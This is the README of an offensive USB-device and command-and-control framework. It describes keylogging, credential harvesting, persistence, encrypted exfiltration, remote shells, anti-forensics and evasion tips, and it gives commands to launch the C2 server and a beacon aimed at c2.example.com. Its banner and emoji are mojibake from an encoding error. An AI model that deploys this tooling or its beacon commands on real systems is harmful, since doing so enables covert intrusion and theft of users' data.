# DarkSec NIGHTBLADE

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â•‘
â•‘  â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•”â•â•â•â•â•     â•‘
â•‘  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘          â•‘
â•‘  â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•  â–ˆâ–ˆâ•‘          â•‘
â•‘  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—     â•‘
â•‘  â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â•â•â•šâ•â•â•â•â•â•â• â•šâ•â•â•â•â•â•     â•‘
â•‘      â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—                  â•‘
â•‘      â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â• â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•                  â•‘
â•‘      â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘                     â•‘
â•‘      â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘                     â•‘
â•‘      â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘                     â•‘
â•‘      â•šâ•â•  â•šâ•â•â•â•â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•  â•šâ•â•   â•šâ•â•                     â•‘
â•‘          â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—             â•‘
â•‘          â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â•â•             â•‘
â•‘          â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—               â•‘
â•‘          â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•               â•‘
â•‘          â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—             â•‘
â•‘          â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•             â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

> **USB Army Knife Exploitation Framework**  
> *"The blade that cuts through digital darkness"*

[![Version](https://img.shields.io/badge/version-2.0-red.svg)](https://github.com/darksec/nightblade)
[![Platform](https://img.shields.io/badge/platform-ESP32-blue.svg)](https://www.espressif.com/en/products/socs/esp32)
[![License](https://img.shields.io/badge/license-Custom-orange.svg)](LICENSE)
[![Status](https://img.shields.io/badge/status-Production-green.svg)](https://github.com/darksec/nightblade)

---

## ğŸ—¡ï¸ Overview

**DarkSec NIGHTBLADE** is an advanced USB Army Knife flasher and exploitation framework designed for professional penetration testers and red team operators. Combining enterprise-grade command & control infrastructure with sophisticated attack capabilities, NIGHTBLADE represents the cutting edge of USB-based offensive security tools.

### Key Features

#### Core C2 Infrastructure
- ğŸ¯ **Enterprise-Grade C2 Server** - 30+ API endpoints with SQLite persistence
- ğŸ”’ **SSL/TLS Encryption** - HTTPS support with auto-generated certificates
- ğŸŒ **Ngrok Integration** - Public tunnel access with authentication
- âš¡ **WebSocket Real-time Shell** - Bidirectional instant command execution
- ğŸ” **Multi-User Support** - Role-based access control (admin/operator)
- ğŸ“Š **Command History Tracking** - Full audit trail with operator attribution
- ğŸ·ï¸ **Beacon Tagging System** - Organize targets by campaign/group
- ğŸ’š **Health Monitoring** - Automatic beacon health status tracking
- ğŸ¤– **Auto-Tasking** - Execute commands on beacon registration
- ğŸ“¤ **Data Export** - CSV/JSON exports for reports
- ğŸ§© **Plugin System** - Extensible custom functionality
- ğŸ” **Encrypted Exfiltration** - Fernet encryption + gzip compression

#### Attack Capabilities
- ğŸ“¸ **Screenshot Capture** - Visual reconnaissance with organized storage
- âŒ¨ï¸ **Keylogger Integration** - Real-time keystroke capture and window tracking
- ğŸ”‘ **Credential Harvesting** - Automated collection from browsers, memory, and files
- ğŸ–¥ï¸ **Process Management** - List, kill, and start processes remotely
- ğŸ“ **File Operations** - Complete file browser with upload/download/execute
- ğŸ”„ **Persistence Management** - Multiple methods including registry, tasks, services
- ğŸŒ **Network Reconnaissance** - Scanning, port enumeration, ARP/DNS discovery
- â° **Task Scheduling** - Time-based automated operations
- ğŸ”— **Multi-Beacon Control** - Bulk operations across multiple targets

#### Development Tools
- ğŸ¨ **DuckyScript Editor** - Advanced payload development environment
- ğŸ“š **Payload Library** - Pre-built attack modules for various scenarios

---

## ğŸš€ Quick Start

### Prerequisites

```bash
# Install Python dependencies
pip install -r requirements.txt

# Or manually:
pip install ttkbootstrap pyserial requests flask flask-sock pyngrok cryptography

# Install ESP-IDF tools (for firmware flashing)
# Follow: https://docs.espressif.com/projects/esp-idf/en/latest/esp32/get-started/
```

### Installation

```bash
# Clone the repository
git clone https://github.com/wickednull/nightblade.git
cd nightblade

python3 -m venv venv

source venv/bin/activate

pip install -r requirements.txt

# Run the installer
python installer_gui.py
```

### Basic Usage

1. **Connect your USB Army Knife device** (ESP32-based)
2. **Launch NIGHTBLADE**: `python installer_gui.py`
3. **Flash firmware**: Navigate to âš¡ Flasher tab â†’ Install Firmware
4. **Create payloads**: Use ğŸ“ DuckyScript Editor
5. **Start C2 server**: Go to ğŸ•¸ï¸ C2 Server â†’ Start Server
6. **Deploy and monitor**: Track beacons and execute commands

---

## ğŸ“š Documentation

### Core Modules

#### ğŸ•¸ï¸ C2 Server - Elite Edition
Enterprise-grade command and control with 12 advanced features:

**Core Features:**
- SQLite database backend (15+ tables)
- Multi-user support with role-based permissions
- API authentication with SHA256 hashed keys
- Command history with operator tracking
- Beacon health monitoring (healthy/warning/dead)
- Auto-tasking on beacon registration

**Advanced Capabilities:**
- SSL/TLS encryption (HTTPS)
- Ngrok integration for public access
- WebSocket real-time shell
- File compression/encryption (Fernet + gzip)
- Beacon grouping/tagging system
- Data export (CSV/JSON)
- Extensible plugin system

**Start Server:**
```bash
# Basic HTTP
python c2_server_enhanced.py --host 0.0.0.0 --port 8443

# With SSL/TLS
python c2_server_enhanced.py --ssl --port 443

# With Ngrok tunnel
python c2_server_enhanced.py --ngrok --ngrok-token YOUR_TOKEN

# Full enterprise mode
python c2_server_enhanced.py --ssl --ngrok --ngrok-token YOUR_TOKEN
```

#### ğŸ“ DuckyScript Editor
Advanced payload development with:
- Syntax highlighting
- Variable support
- Multiple keyboard layouts
- Payload templates
- Direct device deployment

#### ğŸ“¦ Payload Library
Pre-built exploits categorized by:
- Information Gathering
- Persistence
- Exfiltration
- Credential Harvesting
- Network Operations
- Social Engineering

#### âš¡ Firmware Flasher
ESP32 device management:
- Auto-detect devices
- One-click firmware installation
- Filesystem upload
- eFuse management
- Serial monitor

---

## ğŸ¯ Advanced Features

### C2 Server Capabilities - Elite Edition

```python
# API Endpoints (30+)
# Beacon Management
/api/beacon/register          # Beacon registration with auto-tasks
/api/beacon/checkin/<id>      # Command check-in
/api/beacon/<id>/command      # Send command with operator tracking
/api/beacon/<id>/history      # Command history viewer
/api/beacon/<id>/tags         # Tag management
/api/beacons                  # List beacons with filtering (group/tags)
/api/beacons/bulk/command     # Bulk operations

# Data Collection
/api/beacon/<id>/screenshot   # Screenshot upload (encrypted)
/api/beacon/<id>/keylog       # Keylogger data
/api/beacon/<id>/credentials  # Credential harvesting
/api/beacon/<id>/exfil        # Encrypted data exfiltration

# Operations
/api/beacon/<id>/processes    # Process management
/api/beacon/<id>/files        # File operations
/api/beacon/<id>/persistence  # Persistence management
/api/beacon/<id>/network      # Network operations
/api/beacon/<id>/sysinfo      # System information

# Advanced Features
/api/auto-tasks               # Auto-task management (GET/POST)
/api/export/<type>            # Data export (CSV/JSON)
/api/users/create             # Multi-user management
/api/plugins                  # Plugin system
/api/plugins/<name>           # Execute plugin
/api/credentials              # View all credentials

# Real-time
/ws/shell/<beacon_id>         # WebSocket real-time shell
```

### Example Beacon Payload

```python
# Advanced beacon with all features
python advanced_beacon.py --server http://c2.example.com:8443
```

Features:
- Auto-registration
- Command execution
- Screenshot capture
- Keylogging
- Credential dumping
- Persistence installation
- Network reconnaissance

---

## ğŸ› ï¸ Architecture

### System Components

```
DarkSec NIGHTBLADE
â”œâ”€â”€ installer_gui.py           # Main GUI application
â”œâ”€â”€ c2_server.py              # C2 server (standard edition)
â”œâ”€â”€ c2_server_enhanced.py     # C2 server (elite edition - 12 features)
â”œâ”€â”€ duckyscript_converter.py  # DuckyScript compiler
â”œâ”€â”€ payloads/                 # Payload library
â”‚   â”œâ”€â”€ info_gathering/
â”‚   â”œâ”€â”€ persistence/
â”‚   â”œâ”€â”€ exfiltration/
â”‚   â””â”€â”€ credential_harvest/
â”œâ”€â”€ firmware/                 # ESP32 firmware binaries
â””â”€â”€ encryption_key.bin        # C2 encryption key (auto-generated)
```

### Database Schema

```sql
-- 15+ persistent tables for complete operation tracking
beacons           # Beacon tracking with tags, groups, health status
commands          # Command queue with operator attribution
exfil_data        # Encrypted/compressed exfiltrated data
screenshots       # Captured screenshots
keylogs           # Keystroke recordings
credentials       # Harvested credentials by source
sessions          # Interactive WebSocket shell sessions
tasks             # Scheduled operations
auto_tasks        # NEW: Auto-tasks on beacon registration
api_keys          # Authentication with roles & permissions
files             # File browser cache
beacon_groups     # NEW: Beacon grouping system
listener_profiles # NEW: Multiple listener configurations
audit_log         # NEW: Complete operation audit trail
```

---

## ğŸ¨ GUI Overview

### Tabs

1. **ğŸ  Welcome** - Quick setup and project initialization
2. **âš¡ Flasher** - Device firmware management
3. **ğŸ”§ eFuse** - ESP32 configuration
4. **ğŸ¤– Agent** - Autonomous operation modes
5. **ğŸ“ DuckyScript** - Payload editor
6. **ğŸ“š Library** - Pre-built payloads
7. **ğŸ“Ÿ Serial Monitor** - Device communication
8. **ğŸ‘¤ Profiles** - Device configurations
9. **ğŸ­ Orchestration** - Multi-stage attacks
10. **ğŸ•¸ï¸ C2 Server** - Command & control
11. **ğŸ“¡ WiFi Attacks** - Wireless exploitation
12. **ğŸ“¶ Bluetooth** - BLE attacks
13. **ğŸ­ Obfuscation** - Payload protection
14. **ğŸ£ Social Engineering** - Pretexting tools
15. **ğŸŒ Network Recon** - Discovery tools
16. **ğŸ’€ Post-Exploit** - Advanced techniques
17. **ğŸ“Š Dashboard** - Operations overview

---

## ğŸ”’ Security Considerations

### Operational Security

- âœ… Use VPNs/proxies for C2 communications
- âœ… Enable API key authentication
- âœ… Encrypt exfiltrated data
- âœ… Use domain fronting when possible
- âœ… Implement beacon jitter
- âœ… Rotate credentials regularly

### OPSEC Features

- Encrypted C2 communications
- API key authentication
- Audit logging
- Beacon fingerprint randomization
- Anti-forensics capabilities
- Secure data deletion

---

## ğŸ“ Use Cases

### Authorized Penetration Testing
- Red team engagements
- Physical security assessments
- Social engineering testing
- Insider threat simulation

### Security Research
- Exploit development
- Detection capability testing
- Blue team training
- Attack simulation

### Defensive Security
- Detection rule development
- SOC analyst training
- Incident response drills
- EDR/AV testing

---

## ğŸ“Š Technical Specifications

### Elite Edition C2 Server

| Component | Specification |
|-----------|---------------|
| **API Endpoints** | 30+ RESTful + WebSocket |
| **Database** | SQLite with 15+ persistent tables |
| **SSL/TLS** | âœ… Auto-generated certificates |
| **Ngrok Integration** | âœ… Public tunnel with auth |
| **WebSocket Shell** | âœ… Real-time bidirectional |
| **Encryption** | âœ… Fernet + gzip for exfil |
| **Multi-User** | âœ… Role-based access control |
| **Health Monitoring** | âœ… Automated status tracking |
| **Auto-Tasking** | âœ… On registration triggers |
| **Data Export** | âœ… CSV/JSON/HTML reports |
| **Plugin System** | âœ… Extensible architecture |
| **Command History** | âœ… Full audit with operators |
| **Beacon Tagging** | âœ… Campaign organization |

### Attack Capabilities

| Feature | Status |
|---------|--------|
| **Screenshot System** | âœ… Full capture & encrypted storage |
| **Keylogger** | âœ… Real-time with window tracking |
| **Credential Storage** | âœ… Organized harvesting database |
| **Persistence** | âœ… Automated multi-method |
| **Network Operations** | âœ… Advanced reconnaissance |
| **Multi-Beacon Control** | âœ… Bulk operations support |
| **Authentication** | SHA256 API key + permissions |
| **Platform Support** | Windows, Linux, macOS |

---

## ğŸ¤ Contributing

We welcome contributions! Please see [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Development Setup

```bash
git clone https://github.com/darksec/nightblade.git
cd nightblade
pip install -r requirements.txt
python installer_gui.py
```

---

## ğŸ“„ License

This project is licensed under a custom license. See [LICENSE](LICENSE) for details.

---

## âš ï¸ Legal Disclaimer

```
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘                      âš ï¸  LEGAL NOTICE                         â•‘
â•‘                                                               â•‘
â•‘  DarkSec NIGHTBLADE is designed exclusively for authorized   â•‘
â•‘  security testing, penetration testing, and red team         â•‘
â•‘  operations. Unauthorized access to computer systems is      â•‘
â•‘  illegal.                                                     â•‘
â•‘                                                               â•‘
â•‘  Users must obtain proper authorization before deployment.   â•‘
â•‘  DarkSec Labs and the developers assume no liability for     â•‘
â•‘  misuse of this software.                                    â•‘
â•‘                                                               â•‘
â•‘  By using this tool, you agree to comply with all            â•‘
â•‘  applicable laws and regulations.                            â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
```

---


---

## ğŸ™ Credits

**Developed by DarkSec Labs**

Special thanks to:
- The ESP32 community
- DuckyScript developers
- Open source security researchers
- Red team operators worldwide

---


---

<div align="center">

**DarkSec NIGHTBLADE v2.0**  
*From DarkSec Labs - Forging the future of offensive security*

âš”ï¸ **The blade that cuts through digital darkness** âš”ï¸

</div>
